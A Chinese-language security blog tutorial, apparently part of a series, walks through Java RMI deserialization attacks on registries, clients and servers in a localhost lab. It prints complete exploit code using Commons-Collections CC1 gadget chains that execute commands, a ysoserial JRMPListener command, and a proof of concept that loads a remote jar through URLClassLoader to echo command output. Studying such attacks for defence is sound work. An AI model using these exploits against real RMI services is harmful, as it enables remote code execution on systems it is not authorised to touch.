# Java 反序列化之 RMI 专题 02-RMI 的几种攻击方式

## 0x01 前言

续上篇

## 0x02 RMI 的基本攻击方式

根据 RMI 的部分，有这么一些攻击方式

- RMI Client 打 RMI Registry
- RMI Client 打 RMI Server
- RMI Client

### 1. 攻击 RMI Registry

> 只有一种客户端打注册中心

注册中心的交互主要是这一句话

JAVA

```
Naming.bind("rmi://127.0.0.1:1099/sayHello", new RemoteObjImpl());
```

这里的交互方式不只是只有 bind，还有其他的一系列方式，如下

我们与注册中心进行交互可以使用如下几种方式：

- list
- bind
- rebind
- unbind
- lookup

这几种方法位于 `RegistryImpl_Skel#dispatch` 中，如果存在对传入的对象调用 `readObject()` 方法，则可以利用，`dispatch` 里面对应关系如下：

- 0 —– bind
- 1 —– list
- 2 —– lookup
- 3 —– rebind
- 4 —– unbind

首先是 list 这种攻击，因为除了 list 和 lookup 两个，其余的交互在 8u121 之后都是需要 localhost 的。
但是讲道理，list 的这种攻击比较鸡肋。

#### 使用 list() 方法进行鸡肋攻击

用 `list()` 方法可以列出目标上所有绑定的对象：

在 RMIClient 文件夹里面新建一个新的 Java class，因为我们后续的攻击肯定是从用户的客户端出发，往服务端这里打的。代码如下

JAVA

```
// 针对 Registry 的 list 鸡肋攻击  
import java.rmi.Naming;  
import java.rmi.RemoteException;  
  
// 针对 Registry 的 list 鸡肋攻击  
public class RegistryListAttack {  
    public static void main(String[] args) throws Exception{  
        RemoteObj remoteObj = new RemoteObj() {  
            @Override  
 public String sayHello(String keywords) throws RemoteException {  
                return null;  
 }  
        };  
 String[] s = Naming.list("rmi://127.0.0.1:1099");  
 System.out.println(s);  
 }  
}
```

运行的时候，会打印出如下信息

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/RegistryList.png)

因为这里没有 `readObject()`，所以无法进行反序列化，这样我们的攻击面就太窄了。我们可以跳进 `RegistryImpl_Skel#dispatch` 看一下，list 对应的是 case1

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/listCode.png)

只有 `writeObject()`，没有 `readObject()`

#### bind 或 rebind 的攻击

直接看 bind 方法和 rebind 方法的源码吧

case0 是 bind 方法的，case2 是 rebind 方法的。

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/bindCode.png)![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/rebindCode.png)

这两个地方都是有反序列化的，进行反序列化的参数是参数名以及远程对象；这就和我们前面分析的通信原理过程结合起来了。

所以这个 bind 和 rebind 的服务端，就有概率可以作为反序列化攻击的一个入口类，如果服务端这里存在 CC 链相关的组件漏洞，那么就可以反序列化攻击，这里为了凸显的话，我们先把 CC 链导进来，这里我们就以 CC1 为例。

XML

```
<dependencies>  
 <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
 	<dependency>  
 	<groupId>commons-collections</groupId>  
	 <artifactId>commons-collections</artifactId>  
	 <version>3.2.1</version>  
 </dependency></dependencies>
```

逆向分析一下这条链子，原本 CC1 的最后面是 `InvocationHandler.readObject()`，现在我们要让客户端的 `bind()` 方法执行 `readObject()`。

回过头去看前面的，在客户端收到信息的时候是一个 Proxy 对象，让 Proxy 对象被执行的时候去调 `readObject()` 方法，可以先点进去 Proxy 对象看一看，其中有一个非常引人注目的方法 ———— `newProxyInstance()`

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/ProxyClass.png)

上面的是传参，下面的是很明显的存在反序列化漏洞的地方，所以我们把 CC1 的那串恶意类拿出来就可以了，让 Proxy 执行 `newProxyInstance()` 即可，EXP 如下

JAVA

```
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.rmi.Remote;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.util.HashMap;  
import java.util.Map;  
  
public class AttackRegistryEXP {  
    public static void main(String[] args) throws Exception{  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  
 InvocationHandler handler = (InvocationHandler) CC1();  
 Remote remote = Remote.class.cast(Proxy.newProxyInstance(  
                Remote.class.getClassLoader(),new Class[] { Remote.class }, handler));  
 registry.bind("test",remote);  
 }  
  
    public static Object CC1() throws Exception{  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  
 new InvokerTransformer("getMethod",  
 new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
 new InvokerTransformer("invoke"  
 , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 hashMap.put("value","drunkbaby");  
 Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 aihConstructor.setAccessible(true);  
 Object o = aihConstructor.newInstance(Target.class, transformedMap);  
 return o;  
 }  
}
```

Remote.class.cast 这里实际上是将一个代理对象转换为了 Remote 对象，因为 `bind()` 方法这里需要传入 Remote 对象。

- rebind 的攻击也是如此，将 `registry.bind("test",remote);` 替换为 `rebind()` 方法即可。

#### unbind 或 lookup 的攻击

先看一下 unbind 和 lookup 的源码部分，可不可以进行反序列化的攻击

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/lookupCode.png)![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/unbindCode.png)

因为 unbind 和 lookup 的最终利用和思想都是一样的，这里我们就只拿 lookup 这里来学习。

大致的思路还是和 `bind/rebind` 思路是一样的，但是 lookup 这里只可以传入 `String` 类型，这里我们可以通过伪造 `lookup` 连接请求进行利用，修改 `lookup` 方法代码使其可以传入对象。

我们可以利用反射来实现这种攻击。

EXP 如下

JAVA

```
public class AttackRegistryEXP02 {  
    public static void main(String[] args) throws Exception{  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  
 InvocationHandler handler = (InvocationHandler) CC1();  
 Remote remote = Remote.class.cast(Proxy.newProxyInstance(  
                Remote.class.getClassLoader(),new Class[] { Remote.class }, handler));  
  
 Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();  
 fields_0[0].setAccessible(true);  
 UnicastRef ref = (UnicastRef) fields_0[0].get(registry);  
  
 //获取operations  
  
 Field[] fields_1 = registry.getClass().getDeclaredFields();  
 fields_1[0].setAccessible(true);  
 Operation[] operations = (Operation[]) fields_1[0].get(registry);  
  
 // 伪造lookup的代码，去伪造传输信息  
 RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);  
 ObjectOutput var3 = var2.getOutputStream();  
 var3.writeObject(remote);  
 ref.invoke(var2);  
 }  
    public static Object CC1() throws Exception{  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  
 new InvokerTransformer("getMethod",  
 new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
 new InvokerTransformer("invoke"  
 , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 hashMap.put("value","drunkbaby");  
 Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 aihConstructor.setAccessible(true);  
 Object o = aihConstructor.newInstance(Target.class, transformedMap);  
 return o;  
 }  
}
```

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/unbindAttack.png)

### 2. 攻击客户端

- 上篇我们分析过，是在 `unmarshalValue()` 那个地方存在入口类。

#### 注册中心攻击客户端

对于注册中心来说，我们还是从这几个方法触发：

- bind
- unbind
- rebind
- list
- lookup

除了`unbind`和`rebind`都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，因为 EXP 实在太长了。命令如下：

BASH

```
java -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'calc'
```

然后使用客户端去访问：

JAVA

```
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
 
public class Client {
    public static void main(String[] args) throws RemoteException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        registry.list();
    }
}
```

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/RegistryAttackClient.png)

#### 服务端攻击客户端

服务端攻击客户端，大抵可以分为以下两种情景。

1. 服务端返回Object对象
2. 远程加载对象

##### 服务端返回Object对象

在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以CC1为例：

- User接口，返回的是Object对象

JAVA

```
public interface User extends java.rmi.Remote {
    public Object getUser() throws Exception;
}
```

- 服务端实现 User 接口，返回 CC1 的恶意 Object 对象

JAVA

```
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.Serializable;  
import java.lang.annotation.Retention;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Proxy;  
import java.rmi.RemoteException;  
import java.rmi.server.UnicastRemoteObject;  
import java.util.HashMap;  
import java.util.Map;  
  
public class ServerReturnObject extends UnicastRemoteObject implements User  {  
    public String name;  
 public int age;  
  
 public ServerReturnObject(String name, int age) throws RemoteException {  
        super();  
 this.name = name;  
 this.age = age;  
 }  
  
    public Object getUser() throws Exception {  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
 new InvokerTransformer("getMethod",  
 new Class[]{String.class, Class[].class},  
 new Object[]{"getRuntime",  
 new Class[0]}),  
 new InvokerTransformer("invoke",  
 new Class[]{Object.class, Object[].class},  
 new Object[]{null, new Object[0]}),  
 new InvokerTransformer("exec",  
 new Class[]{String.class},  
 new String[]{"calc.exe"}),  
 };  
 Transformer transformerChain = new ChainedTransformer(transformers);  
 Map innerMap = new HashMap();  
 Map outerMap = LazyMap.decorate(innerMap, transformerChain);  
  
 Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);  
 construct.setAccessible(true);  
 InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);  
 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);  
 handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);  
  
  
 return (Object) handler;  
 }  
}
```

- 服务端将恶意对象绑定到注册中心

JAVA

```
import java.rmi.AlreadyBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class EvilClassServer {  
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {  
        User liming = new ServerReturnObject("liming",15);  
 Registry registry = LocateRegistry.createRegistry(1099);  
 registry.bind("user",liming);  
  
 System.out.println("registry is running...");  
  
 System.out.println("liming is bind in registry");  
 }  
}
```

- 客户端获取对象并调用 `getUser()` 方法，将反序列化服务端传来的恶意远程对象。

JAVA

```
import java.rmi.Naming;  
import java.rmi.NotBoundException;  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
// 服务端打客户端，返回 Object 对象  
public class EvilClient {  
    public static void main(String[] args) throws Exception {  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  
 User user = (User)registry.lookup("user");  
 user.getUser();  
 }  
}
```

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/EvilObject.png)

##### 加载远程对象

这个就是 P神 写的那个，codebase 这种。这个可用性还是不咋样，我个人觉得本身这个注册中心，或者是服务端打出来，就没啥意义；再加上利用条件苛刻，就更没劲了。

当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。

**java.rmi.server.codebase：**codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。

RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的class文件可以使用`http://`、`ftp://`、file://进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些**子类**中被重写的方法，客户端就需要从服务端提供的`java.rmi.server.codebase`URL去加载类；对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的**子类**，那么服务端需要从客户端提供的`java.rmi.server.codebase`URL去加载对应的类。客户端与服务端两边的`java.rmi.server.codebase`URL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：

1. 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置`java.security.policy`，这在后面的利用中可以看到。
2. 属性 `java.rmi.server.useCodebaseOnly` 的值必需为false。但是从JDK 6u45、7u21开始，`java.rmi.server.useCodebaseOnly` 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的`java.rmi.server.codebase` 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。

总的来说利用条件十分苛刻，可用性不强。

### 3. 攻击服务端

#### 客户端打服务端

服务端代码

JAVA

```
import java.rmi.Naming;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.server.UnicastRemoteObject;  
  
public class VictimServer {  
    public class RemoteHelloWorld extends UnicastRemoteObject implements RemoteObj {  
        protected RemoteHelloWorld() throws RemoteException {  
            super();  
 }  
  
        public String hello() throws RemoteException {  
            System.out.println("调用了hello方法");  
 return "Hello world";  
 }  
  
        public void evil(Object obj) throws RemoteException {  
            System.out.println("调用了evil方法，传递对象为："+obj);  
 }  
  
        @Override  
 public String sayHello(String keywords) throws RemoteException {  
            return null;  
 }  
    }  
    private void start() throws Exception {  
        RemoteHelloWorld h = new RemoteHelloWorld();  
 LocateRegistry.createRegistry(1099);  
 Naming.rebind("rmi://127.0.0.1:1099/Hello", h);  
 }  
  
    public static void main(String[] args) throws Exception {  
        new VictimServer().start();  
 }  
}
```

- jdk版本1.7
- 使用具有漏洞的Commons-Collections3.1组件
- RMI提供的数据有Object类型（因为攻击payload就是Object类型）

这段不是很懂，客户端代码如下

JAVA

```
import Server.IRemoteHelloWorld;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
 
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.rmi.Naming;
import java.util.HashMap;
import java.util.Map;
import Server.IRemoteHelloWorld;
 
public class RMIClient {
    public static void main(String[] args) throws Exception {
        IRemoteHelloWorld r = (IRemoteHelloWorld) Naming.lookup("rmi://127.0.0.1:1099/Hello");
        r.evil(getpayload());
    }
 
    public static Object getpayload() throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
 
        Map map = new HashMap();
        map.put("value", "lala");
        Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
 
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, transformedMap);
        return instance;
    }
 
}
```

这样的话，不是能够直接调用服务端的类了么，不懂。

#### 远程加载对象

和上边Server打Client一样利用条件非常苛刻。

参考：https://paper.seebug.org/1091/#serverrmi

## 0x03 RMI 进阶攻击方式

### 1. 利用 URLClassLoader实现回显攻击

攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端

远程demo：

JAVA

```
import java.io.BufferedReader;
import java.io.InputStreamReader;
 
public class ErrorBaseExec {
 
    public static void do_exec(String args) throws Exception
    {
        Process proc = Runtime.getRuntime().exec(args);
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuffer sb = new StringBuffer();
        String line;
        while ((line = br.readLine()) != null)
        {
            sb.append(line).append("\n");
        }
        String result = sb.toString();
        Exception e=new Exception(result);
        throw e;
    }
}
```

通过如下命令制作成jar包：

BASH

```
javac ErrorBaseExec.java
jar -cvf RMIexploit.jar ErrorBaseExec.class
```

客户端POC：

JAVA

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
 
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
 
import java.net.URLClassLoader;
 
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
 
import java.util.HashMap;
import java.util.Map;
 
 
public class Client {
    public static Constructor<?> getFirstCtor(final String name)
            throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
 
        return ctor;
    }
 
    public static void main(String[] args) throws Exception {
        String ip = "127.0.0.1"; //注册中心ip
        int port = 1099; //注册中心端口
        String remotejar = 远程jar;
        String command = "whoami";
        final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
        try {
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(java.net.URLClassLoader.class),
                    new InvokerTransformer("getConstructor",
                            new Class[] { Class[].class },
                            new Object[] { new Class[] { java.net.URL[].class } }),
                    new InvokerTransformer("newInstance",
                            new Class[] { Object[].class },
                            new Object[] {
                                    new Object[] {
                                            new java.net.URL[] { new java.net.URL(remotejar) }
                                    }
                            }),
                    new InvokerTransformer("loadClass",
                            new Class[] { String.class },
                            new Object[] { "ErrorBaseExec" }),
                    new InvokerTransformer("getMethod",
                            new Class[] { String.class, Class[].class },
                            new Object[] { "do_exec", new Class[] { String.class } }),
                    new InvokerTransformer("invoke",
                            new Class[] { Object.class, Object[].class },
                            new Object[] { null, new String[] { command } })
            };
            Transformer transformedChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "value");
 
            Map outerMap = TransformedMap.decorate(innerMap, null,
                    transformedChain);
            Class cl = Class.forName(
                    "sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
 
            Object instance = ctor.newInstance(Target.class, outerMap);
            Registry registry = LocateRegistry.getRegistry(ip, port);
            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)
                    .newInstance(Target.class,
                            outerMap);
            Remote r = Remote.class.cast(Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, h));
            registry.bind("liming", r);
        } catch (Exception e) {
            try {
                System.out.print(e.getCause().getCause().getCause().getMessage());
            } catch (Exception ee) {
                throw e;
            }
        }
    }
}
```

![img](https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/URLClassLoader.png)

## 0x03 小结

感觉在这块将要淘汰的东西上浪费太久的时间了。醉了

继续往前。学 jndi